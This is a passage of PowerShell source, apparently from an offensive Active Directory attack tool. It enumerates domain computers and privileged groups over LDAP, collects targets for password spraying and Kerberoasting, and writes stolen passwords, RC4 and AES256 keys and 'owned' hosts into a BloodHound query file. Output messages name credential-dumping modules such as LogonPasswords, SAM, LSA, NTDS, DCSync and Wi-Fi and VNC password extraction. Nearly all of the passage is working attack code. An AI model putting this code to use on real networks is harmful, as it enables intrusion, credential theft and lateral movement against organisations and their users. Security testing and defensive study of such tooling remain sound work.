            elseif ($Targets -match "^(\d{1,3}\.){3}\d{1,3}$") {
                # Single IP address
                Write-Log -Message "Processing single IP address: $Targets" -Function "Get-IPRange"
                [array]$Computers = @($Targets)  # Ensure [array]$Computers is an array
                $IPAddress = $true
            }
            else {
                # It's a string meant for LDAP processing
                Write-Log -Message "Target identified as a non-IP address for LDAP processing" -Function "Get-IPRange"
                [array]$Computers = $null
                $IPAddress = $false
            }
        
            return @($Computers, $IPAddress)
        }
        catch {
            Write-Error "An error occurred: $_"
            return @($null, $false)  # Return null to indicate error
        }
    }

    # Evaluate $Targets before processing
    if ($Method -in $ComputerTargetMethods) {
        Write-Log -Message "Starting target evaluation" -Function "Main"
        $type = CheckTargetTypeIPCIDR -Targets $Targets

        if ($type -eq "CIDR" -or $type -eq "IPAddress") {
            $IPorCIDRResults = Get-IPRange -Targets $Targets
            [array]$Computers = $IPorCIDRResults[0]
            $IPAddress = $IPorCIDRResults[1]
        }
        elseif ($type -eq "LDAP Query") {
            Write-Log -Message "Target is for LDAP Query" -Function "Main"
            [array]$Computers = $null
            $IPAddress = $false
        }
    }


    function Gather-LDAPComputers {
        Write-Log -Message "Initializing Gather-LDAPComputers" -Function Gather-LDAPComputers

        Write-Log "Performing initial LDAP query for all enabled computers." -Function Gather-LDAPComputers
        $searcher = New-Searcher
        $searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))
        $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

        # Query all computers and categorize them
        $allComputers = $searcher.FindAll() | Where-Object {
            $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
        }

        # Assign to global variables based on category
        $Global:TargetsAll = $allComputers | Select-Object -Unique *

        $Global:TargetsWorkstations = $Global:TargetsAll | Where-Object {
            $_.Properties["operatingSystem"][0] -notlike "*windows*server*"
        } | Select-Object -Unique *

        $Global:TargetsServers = $Global:TargetsAll | Where-Object {
            $_.Properties["operatingSystem"][0] -like "*windows*server*" -and
            $_.Properties["operatingSystem"][0] -notlike "*domain controller*"
        } | Select-Object -Unique *

        # We need to modify the filter a little to identify Domain Controllers:
        $searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        $domainControllers = $searcher.FindAll() | Where-Object {
            $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
        }

        $Global:TargetsDomainControllers = $domainControllers | Select-Object -Unique *

        Write-Log "LDAP query complete and results cached." -Function Gather-LDAPComputers
    }


    function Process-LDAPQuery {
        param (
            [string]$Targets
        )

        Write-Log -Message "Initializing Process-LDAPQuery" -Function Process-LDAPQuery
        [array]$Computers = @()

        # Check if the required global variables are null or not defined
        if (-not $Global:TargetsAll) {
            Write-Log "Global variables not populated, running Gather-LDAPComputers." -Function Process-LDAPQuery
            Gather-LDAPComputers
        }

        if ($Targets -match "^\*.*|.*\*$") {
            Write-Log "Obtaining wildcard computers (Enabled) from cached data." -Function Process-LDAPQuery
            $wildcardFilter = $Targets -replace "\*", "*"
            [array]$Computers = $Global:TargetsAll | Where-Object {
                $_.Properties["dnshostname"][0] -like $wildcardFilter
            } | Select-Object -Unique *
        }
        elseif ($Targets -eq "Workstations") {
            Write-Log "Using cached Workstations data." -Function Process-LDAPQuery
            [array]$Computers = $Global:TargetsWorkstations | Select-Object *
        }
        elseif ($Targets -eq "Servers") {
            Write-Log "Using cached Servers data." -Function Process-LDAPQuery
            [array]$Computers = $Global:TargetsServers | Select-Object *
        }
        elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {
            Write-Log "Using cached Domain Controllers data." -Function Process-LDAPQuery
            [array]$Computers = $Global:TargetsDomainControllers | Select-Object *
        }
        elseif ($Targets -eq "All" -or $Targets -eq "Everything") {
            Write-Log "Using cached All systems data." -Function Process-LDAPQuery
            [array]$Computers = $Global:TargetsAll | Select-Object *
        }
        elseif (Test-Path $Targets) {
            Write-Log "Processing targets from file: $Targets" -Function Process-LDAPQuery
            $fileContent = Get-Content -Path $Targets
            foreach ($line in $fileContent) {
                $names = $line -split ',' | ForEach-Object { $_.Trim() }
                foreach ($name in $names) {
                    if ([string]::IsNullOrWhiteSpace($name)) { continue }

                    # Attempt to resolve by FQDN
                    $resolvedName = $name
                    if ($name -notlike "*.*") { $resolvedName += ".$Domain" }

                    # First, try to find an exact FQDN match
                    $computer = $Global:TargetsAll | Where-Object { $_.Properties["dnshostname"][0] -ieq $resolvedName }

                    # If no FQDN match, try to match by hostname only
                    if (-not $computer) {
                        $computer = $Global:TargetsAll | Where-Object { $_.Properties["dnshostname"][0].Split('.')[0] -ieq $name }
                    }

                    if ($computer) {
                        [array]$Computers += $computer
                    }
                    else {
                        Write-Warning "[Process-LDAPQuery] No LDAP entry found for $resolvedName or $name"
                    }
                }
            }
        }
        else {
            Write-Log "Processing specific target: $Targets" -Function Process-LDAPQuery
            $resolvedName = $Targets
            if ($Targets -notlike "*.*") { $resolvedName += ".$Domain" }
            [array]$Computers = $Global:TargetsAll | Where-Object {
                $_.Properties["dnshostname"][0] -eq $resolvedName
            } | Select-Object -Unique *

            if (-not [array]$Computers) {
                Write-Warning "[Process-LDAPQuery] No LDAP entry found for the computer: $resolvedName"
            }
        }

        # Ensure we only return unique entries
        [array]$computers = [array]$computers | Select-Object -Unique *

        $Global:ComputerCount = [array]$Computers.Count
        Write-Log "Total number of objects returned: $Global:ComputerCount" -Function Process-LDAPQuery

        return [array]$computers
    }



    if (-not $IPAddress) {
        if ($Method -in $ComputerTargetMethods) {
            [array]$Computers = Process-LDAPQuery -Targets $Targets
        }
    }




    ################################################################################################################
    ############################ Grab interesting users for various parsing functions ##############################
    ################################################################################################################

    function Get-GroupMembers {
        param ([string]$GroupName)
    
        $searcher = New-Searcher
        $searcher.PropertiesToLoad.AddRange(@("member"))
        $searcher.Filter = "(&(objectCategory=group)(cn=$GroupName))"
        $group = $searcher.FindOne()
        $members = @()

        if ($group -ne $null -and $group.Properties["member"]) {
            foreach ($memberDN in $group.Properties["member"]) {
                $searcher.Filter = "(distinguishedName=$memberDN)"
                $searcher.PropertiesToLoad.Clear()
                $searcher.PropertiesToLoad.AddRange(@("samAccountName", "objectClass"))
                $object = $searcher.FindOne()

                if ($object -and $object.Properties["objectClass"] -contains "user") {
                    $samName = $object.Properties["samAccountName"]
                    if ($samName -and $samName.Count -gt 0) {
                        $members += $samName[0].ToString()
                    }
                }
            }
        }

        return $members
    }

    if ($Module -eq "LogonPasswords" -or $Module -eq "eKeys" -or $Module -eq "TGTDeleg" -or ($Module -eq "KerbDump" -and !$NoParse)) {
        $FQDNDomainName = $domain.ToLower()

        # Domain Admins
        if ($null -eq $Global:DomainAdmins -and $Global:DomainAdminsChecked -ne "1") {
            Write-Log -Message "Getting members from the Domain Admins group"
            $Global:DomainAdmins = Get-GroupMembers -GroupName "Domain Admins"
            $Global:DomainAdminsChecked = "1"
            if ($Global:DomainAdmins.Count -eq 0) { 
                $Global:DomainAdmins = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusDomainAdmins = $DomainAdmins | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusDomainAdmins -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusDomainAdmins) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Enterprise Admins
        if ($null -eq $Global:EnterpriseAdmins -and $Global:EnterpriseAdminsChecked -ne "1") {
            Write-Log -Message "Getting members from the Enterprise Admins group"
            $Global:EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction SilentlyContinue
            $Global:EnterpriseAdminsChecked = "1"
            if ($Global:EnterpriseAdmins.Count -eq 0) { 
                $Global:EnterpriseAdmins = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusEnterpriseAdmins = $EnterpriseAdmins | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusEnterpriseAdmins -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusEnterpriseAdmins) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Server Operators
        if ($null -eq $Global:ServerOperators -and $Global:ServerOperatorsChecked -ne "1") {
            Write-Log -Message "Getting members from the Server Operators group"
            $Global:ServerOperators = Get-GroupMembers -GroupName "Server Operators" -ErrorAction SilentlyContinue
            $Global:ServerOperatorsChecked = "1"
            if ($Global:ServerOperators.Count -eq 0) { 
                $Global:ServerOperators = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusServerOperators = $ServerOperators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusServerOperators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusServerOperators) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Account Operators
        if ($null -eq $Global:AccountOperators -and $Global:AccountOperatorsChecked -ne "1") {
            Write-Log -Message "Getting members from the Account Operators group"
            $Global:AccountOperators = Get-GroupMembers -GroupName "Account Operators" -ErrorAction SilentlyContinue
            $Global:AccountOperatorsChecked = "1"
            if ($Global:AccountOperators.Count -eq 0) { 
                $Global:AccountOperators = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusAccountOperators = $AccountOperators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusAccountOperators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusAccountOperators) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Hyper-V Administrators
        if ($null -eq $Global:HyperVAdministrators -and $Global:HyperVAdministratorsChecked -ne "1") {
            Write-Log -Message "Getting members from the Hyper-V Administrators group"
            $Global:HyperVAdministrators = Get-GroupMembers -GroupName "Hyper-V Administrators" -ErrorAction SilentlyContinue
            $Global:HyperVAdministratorsChecked = "1"
            if ($Global:HyperVAdministrators.Count -eq 0) { 
                $Global:HyperVAdministrators = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusHyperVAdministrators = $HyperVAdministrators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusHyperVAdministrators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusHyperVAdministrators) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Storage Replicate Administrators
        if ($null -eq $Global:StorageReplicateAdministrators -and $Global:StorageReplicateAdministratorsChecked -ne "1") {
            Write-Log -Message "Getting members from the Storage Replicate Administrators group"
            $Global:StorageReplicateAdministrators = Get-GroupMembers -GroupName "Storage Replicate Administrators" -ErrorAction SilentlyContinue
            $Global:StorageReplicateAdministratorsChecked = "1"
            if ($Global:StorageReplicateAdministrators.Count -eq 0) { 
                $Global:StorageReplicateAdministrators = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusStorageReplicateAdministrators = $StorageReplicateAdministrators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusStorageReplicateAdministrators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusStorageReplicateAdministrators) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Schema Admins
        if ($null -eq $Global:SchemaAdmins -and $Global:SchemaAdminsChecked -ne "1") {
            Write-Log -Message "Getting members from the Schema Admins group"
            $Global:SchemaAdmins = Get-GroupMembers -GroupName "Schema Admins" -ErrorAction SilentlyContinue
            $Global:SchemaAdminsChecked = "1"
            if ($Global:SchemaAdmins.Count -eq 0) { 
                $Global:SchemaAdmins = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusSchemaAdmins = $SchemaAdmins | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusSchemaAdmins -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusSchemaAdmins) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Key Admins
        if ($null -eq $Global:KeyAdmins -and $Global:KeyAdminsChecked -ne "1") {
            Write-Log -Message "Getting members from the Key Admins group"
            $Global:KeyAdmins = Get-GroupMembers -GroupName "Key Admins" -ErrorAction SilentlyContinue
            $Global:KeyAdminsChecked = "1"
            if ($Global:KeyAdmins.Count -eq 0) { 
                $Global:KeyAdmins = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusKeyAdmins = $KeyAdmins | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusKeyAdmins -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusKeyAdmins) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # Enterprise Key Admins
        if ($null -eq $Global:EnterpriseKeyAdmins -and $Global:EnterpriseKeyAdminsChecked -ne "1") {
            Write-Log -Message "Getting members from the Enterprise Key Admins group"
            $Global:EnterpriseKeyAdmins = Get-GroupMembers -GroupName "Enterprise Key Admins" -ErrorAction SilentlyContinue
            $Global:EnterpriseKeyAdminsChecked = "1"
            if ($Global:EnterpriseKeyAdmins.Count -eq 0) { 
                $Global:EnterpriseKeyAdmins = $null  # Flag empty group
            }
            else {
                [array]$FQDNDomainPlusEnterpriseKeyAdmins = $EnterpriseKeyAdmins | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusEnterpriseKeyAdmins -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusEnterpriseKeyAdmins) { 
                        Write-Log -Message $Name 
                    } 
                    Write-Log -Message "" 
                }
            }
        }

        # DnsAdmins
        if ($null -eq $Global:DnsAdmins -and $Global:DnsAdminsChecked -ne "1") {
            Write-Log -Message "Getting members from the DnsAdmins group"
            $Global:DnsAdmins = Get-GroupMembers -GroupName "DnsAdmins" -ErrorAction SilentlyContinue
            $Global:DnsAdminsChecked = "1"
            if ($Global:DnsAdmins.Count -eq 0) { $Global:DnsAdmins = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusDnsAdmins = $DnsAdmins | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusDnsAdmins -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusDnsAdmins) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # DHCP Administrators
        if ($null -eq $Global:DHCPAdministrators -and $Global:DHCPAdministratorsChecked -ne "1") {
            Write-Log -Message "Getting members from the DHCP Administrators group"
            $Global:DHCPAdministrators = Get-GroupMembers -GroupName "DHCP Administrators" -ErrorAction SilentlyContinue
            $Global:DHCPAdministratorsChecked = "1"
            if ($Global:DHCPAdministrators.Count -eq 0) { $Global:DHCPAdministrators = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusDHCPAdministrators = $DHCPAdministrators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusDHCPAdministrators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusDHCPAdministrators) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # Group Policy Creator Owners
        if ($null -eq $Global:GroupPolicyCreatorOwners -and $Global:GroupPolicyCreatorOwnersChecked -ne "1") {
            Write-Log -Message "Getting members from the Group Policy Creator Owners group"
            $Global:GroupPolicyCreatorOwners = Get-GroupMembers -GroupName "Group Policy Creator Owners" -ErrorAction SilentlyContinue
            $Global:GroupPolicyCreatorOwnersChecked = "1"
            if ($Global:GroupPolicyCreatorOwners.Count -eq 0) { $Global:GroupPolicyCreatorOwners = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusGroupPolicyCreatorOwners = $GroupPolicyCreatorOwners | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusGroupPolicyCreatorOwners -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusGroupPolicyCreatorOwners) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # Backup Operators
        if ($null -eq $Global:BackupOperators -and $Global:BackupOperatorsChecked -ne "1") {
            Write-Log -Message "Getting members from the Backup Operators group"
            $Global:BackupOperators = Get-GroupMembers -GroupName "Backup Operators" -ErrorAction SilentlyContinue
            $Global:BackupOperatorsChecked = "1"
            if ($Global:BackupOperators.Count -eq 0) { $Global:BackupOperators = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusBackupOperators = $BackupOperators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusBackupOperators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusBackupOperators) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # Cert Publishers
        if ($null -eq $Global:CertPublishers -and $Global:CertPublishersChecked -ne "1") {
            Write-Log -Message "Getting members from the Cert Publishers group"
            $Global:CertPublishers = Get-GroupMembers -GroupName "Cert Publishers" -ErrorAction SilentlyContinue
            $Global:CertPublishersChecked = "1"
            if ($Global:CertPublishers.Count -eq 0) { $Global:CertPublishers = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusCertPublishers = $CertPublishers | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusCertPublishers -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusCertPublishers) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # Print Operators
        if ($null -eq $Global:PrintOperators -and $Global:PrintOperatorsChecked -ne "1") {
            Write-Log -Message "Getting members from the Print Operators group"
            $Global:PrintOperators = Get-GroupMembers -GroupName "Print Operators" -ErrorAction SilentlyContinue
            $Global:PrintOperatorsChecked = "1"
            if ($Global:PrintOperators.Count -eq 0) { $Global:PrintOperators = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusPrintOperators = $PrintOperators | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusPrintOperators -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusPrintOperators) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # Organization Management
        if ($null -eq $Global:OrganizationManagement -and $Global:OrganizationManagementChecked -ne "1") {
            Write-Log -Message "Getting members from the Organization Management group"
            $Global:OrganizationManagement = Get-GroupMembers -GroupName "Organization Management" -ErrorAction SilentlyContinue
            $Global:OrganizationManagementChecked = "1"
            if ($Global:OrganizationManagement.Count -eq 0) { $Global:OrganizationManagement = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusOrganizationManagement = $OrganizationManagement | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusOrganizationManagement -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusOrganizationManagement) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }

        # Server Management
        if ($null -eq $Global:ServerManagement -and $Global:ServerManagementChecked -ne "1") {
            Write-Log -Message "Getting members from the Server Management group"
            $Global:ServerManagement = Get-GroupMembers -GroupName "Server Management" -ErrorAction SilentlyContinue
            $Global:ServerManagementChecked = "1"
            if ($Global:ServerManagement.Count -eq 0) { $Global:ServerManagement = $null }  # Flag empty group
            else {
                [array]$FQDNDomainPlusServerManagement = $ServerManagement | ForEach-Object { "$FQDNDomainName\$_" }
                if ($FQDNDomainPlusServerManagement -ne $null) { 
                    foreach ($Name in $FQDNDomainPlusServerManagement) { Write-Log -Message $Name } 
                    Write-Log -Message ""
                }
            }
        }
    }



    if ($Method -eq "Spray") {
        Write-Log -Message  "Performing user LDAP queries for method (Spray)"
        $searcher = New-Searcher
        if ($Targets -eq "AdminCount=1") {
            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(adminCount=1)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
        }
        else {
            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
        }
        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
        $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
        $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }

        if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users" -or $Targets -eq "AdminCount=1") {
            $Targets = $EnabledDomainUsers
        }
        elseif (Test-Path $Targets -PathType Leaf) {
            $EnabledDomainUsers = Get-Content -Path $Targets
        }
        elseif ($Targets -in $EnabledDomainUsers) {
            $EnabledDomainUsers = $Targets
        }
        else {
            $groupMembers = Get-GroupMembers -GroupName $Targets
            if ($groupMembers.Count -gt 0) {
                $EnabledDomainUsers = $groupMembers
            }
            elseif ($groupMembers.Count -eq 0) {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Group either does not exist or is empty"
                return
            }
            else {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Unspecified Error"
                return
            }
        }
    }

    if ($Method -eq "IPMI" -and $Option -eq "IPMI:DomainUsers") {
        Write-Log -Message  "Performing user LDAP queries for method (IPMI)"
        $searcher = New-Searcher
        $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
        $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
        $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] 

        }
    }

    if ($Method -eq "Kerberoast") {
    
        $searcher = New-Searcher

        if ($Option -like "Kerberoast:*") {
            $SplitUser = $Option.Split(':')[1]
         
            Write-Log -Message  "Performing single user LDAP query (Kerberoast)($SplitUser)"
            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$SplitUser)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(ServicePrincipalName=*))"
        }
        else {
        
            Write-Log -Message  "Performing user LDAP queries for method (Kerberoast)"
            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(ServicePrincipalName=*))"
        }

        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
        $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
    
        $RoastUsers = @($users | ForEach-Object { $_.Properties["samAccountName"][0] })

        if ($RoastUsers.Count -eq 0) {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "No candidate user objects found"
            return
        }
        else {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Found $($RoastUsers.Count) roastable Users"
            Write-Host
        }
    }

    # Grab Computer Accounts for spraying
    function Get-ComputerAccounts {
        Write-Log -Message  "Obtaining Computer Accounts (For Spraying) from LDAP"
        $searcher = New-Searcher
        $searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
    
        try {
            $ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
            return $ComputerSamAccounts
        }
        catch {
            Write-Error "Failed to fetch computer accounts. Error: $_"
            return $null
        }
    }
    
    $ComputerSamAccounts = Get-ComputerAccounts


    if (!$LocalAuth) { 
        if (!$CurrentUser) {
            if ($Method -ne "GenRelayList" -or $Method -ne "Kerberoasting" -or $Method -ne "Spray") {
                if ($Method -ne "Spray") {
                    try {
                        $searcher = New-Searcher
                        $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
                        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
                        $user = $searcher.FindOne()
                        $domainUser = $user.Properties["samAccountName"]
                    }
                    Catch {
           
                        if ($Ticket -ne $null) {} 
                        elseif (!$DomainUser) {
                            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                            Write-Host "Specified username is not a valid domain user"
                            return
                                           
                        }
                    }
                }
            }
        }
    }


    ################################################################################################################
    ################################################# Queries ######################################################
    ################################################################################################################


    function Append-BHQuery {
        param(
            [Parameter(Mandatory = $false)]
            [string]$UserName,

            [Parameter(Mandatory = $false)]
            [string]$Password,

            [Parameter(Mandatory = $false)]
            [string]$RC4,

            [Parameter(Mandatory = $false)]
            [string]$AES256,

            [Parameter(Mandatory = $false)]
            [string]$ComputerName,

            [Parameter(Mandatory = $false)]
            [switch]$UserOwned,

            [Parameter(Mandatory = $false)]
            [switch]$AESProperty,

            [Parameter(Mandatory = $false)]
            [switch]$AdminToProperty,

            [Parameter(Mandatory = $false)]
            [switch]$RC4Property,

            [Parameter(Mandatory = $false)]
            [switch]$PasswordProperty,

            [Parameter(Mandatory = $false)]
            [switch]$ComputerOwned,

            [Parameter(Mandatory = $false)]
            [string]$Domain
        )

        try {

            $filePath = "$BloodHound\Query.txt"
            $fileContent = Get-Content -Path $filePath -Raw

            if ($UserName -like "*$*") { return }
            if ($UserName -like "*\*") { return }


            if ($UserName -and $ComputerName -and $AdminToProperty) {
                $formattedUserName = "$($UserName.ToUpper())@$($Domain.ToUpper())"
                $formattedComputerName = "$($ComputerName.ToUpper()).$($Domain.ToUpper())"
                $AdminToEntry = "{atname: ""$formattedUserName"", atcomputername: ""$formattedComputerName""}"
                if (-not $fileContent.Contains($AdminToEntry)) {
                    $fileContent = $fileContent -replace "(?<=FOREACH \(AdminToitem IN \[)(.*)(?=\] \|)", "`$1, $AdminToEntry"
                }
            }

            # sets RC4 property for user
            elseif ($UserName -and $RC4 -and $RC4Property) {
                $formattedUserName = "$($UserName.ToUpper())@$($Domain.ToUpper())"
                $RC4Entry = "{rc4name: ""$formattedUserName"", RC4: ""$RC4""}"
                if (-not $fileContent.Contains($RC4Entry)) {
                    $userEntryRC4 = ", $RC4Entry"
                    $fileContent = $fileContent -replace "(?<=FOREACH \(RC4item IN \[)(.*)(?=\] \|)", "`$1$userEntryRC4"
                }
            }

            # sets AES property for user
            elseif ($UserName -and $AES256 -and $AESProperty) {
                $formattedUserName = "$($UserName.ToUpper())@$($Domain.ToUpper())"
                $AES256Entry = "{aesname: ""$formattedUserName"", AES256: ""$AES256""}"
                if (-not $fileContent.Contains($AES256Entry)) {
                    $fileContent = $fileContent -replace "(?<=FOREACH \(AES256item IN \[)(.*)(?=\] \|)", "`$1, $AES256Entry"
                }
            }


            # Sets username and password property
            elseif ($UserName -and $Password -and $PasswordProperty) {
                $formattedUserName = "$($UserName.ToUpper())@$($Domain.ToUpper())"
                $passwordEntry = "{pname: ""$formattedUserName"", ppassword: ""$Password""}"
                if (-not $fileContent.Contains($passwordEntry)) {
                    $fileContent = $fileContent -replace "(?<=FOREACH \(Passworditem IN \[)(.*)(?=\] \|)", "`$1, $passwordEntry"
                }
            }
            # sets user as owned
            elseif ($UserName -and $UserOwned) {
                $formattedUserName = "$($UserName.ToUpper())@$($Domain.ToUpper())"
                $userEntry = "{uname: ""$formattedUserName""}"
                if (-not $fileContent.Contains($userEntry)) {
                    $fileContent = $fileContent -replace "(?<=FOREACH \(Useritem IN \[)(.*)(?=\] \|)", "`$1, $userEntry"
                }
            }

            # sets computer as owned
            elseif ($ComputerName -and $ComputerOwned) {
                if ($IPAddress) { return }
                $formattedComputerName = "$($ComputerName.ToUpper()).$($Domain.ToUpper())"
                $computerEntry = "{cname: ""$formattedComputerName""}"
                if (-not $fileContent.Contains($computerentry)) {
                    $fileContent = $fileContent -replace "(?<=FOREACH \(Computeritem IN \[)(.*)(?=\] \|)", "`$1, $computerEntry"
                }
            }

            Set-Content -Path $filePath -Value $fileContent

        }
        Catch {}
    }




    ################################################################################################################
    ################################## Information based on selected module ########################################
    ################################################################################################################

    if ($Method -eq "SessionHunter") {
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Searching for systems where privileged users' credentials might be in running memory"
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Filtering by those for which we have admin rights"
        Write-Host
        Start-Sleep -Seconds 3
    }

    if ($Method -eq "DCSync") {
        
        if ($Option -like "dcsync:*") {
            Write-Host "- " -ForegroundColor "Yellow" -NoNewline
            Write-Host "DCSync output will be written to $DCSyncUser"

        }

        else {

            Write-Host "- " -ForegroundColor "Yellow" -NoNewline
            Write-Host "DCSync output will be written to $DCSyncFullDump"

        }
   
        if (!$ShowOutput) {
            Write-Host "- " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Use -ShowOutput to display results in the console"
            Write-Host ""
        }
    }

    # Construct the hash table
    $moduleMessages = @{
        "ConsoleHistory" = "Console History output will be written to $ConsoleHistory"
        "ekeys"          = "eKeys output will be written to $ekeys"
        "FileZilla"      = "FileZilla output will be written to $FileZilla"
        "Files"          = "File output will be written to $UserFiles"
        "KerbDump"       = "Tickets will be written to $Tickets"
        "LSA"            = "LSA output will be written to $LSADump"
        "LSA-Trust"      = "LSA-Trust output will be written to $LSATrust"
        "LogonPasswords" = "LogonPasswords output will be written to $LogonPasswords"
        "NotePad"        = " Notepad output will be written to $NotePad"
        "NTDS"           = "NTDS output will be written to $DCSyncDir"
        "NTLM"           = "NTLM output will be written to $NTLM"
        "SAM"            = "SAM output will be written to $SAM"
        "SCCM"           = "SCCM output will be written to $SCCM"
        "SessionExec"    = "SessionExec output will be written to $SessionExec"
        "Tickets"        = "Tickets will be written to $MimiTickets"
        "Timeroast"      = "Timeroast will be written to $Timeroast"
        "TGTDeleg"       = "TGTDeleg output will be written to $TGTDeleg"
        "VNC"            = "VNC Passwords output will be written to $VNCDump"
        "Wifi"           = "Wi-Fi output will be written to $Wifi"
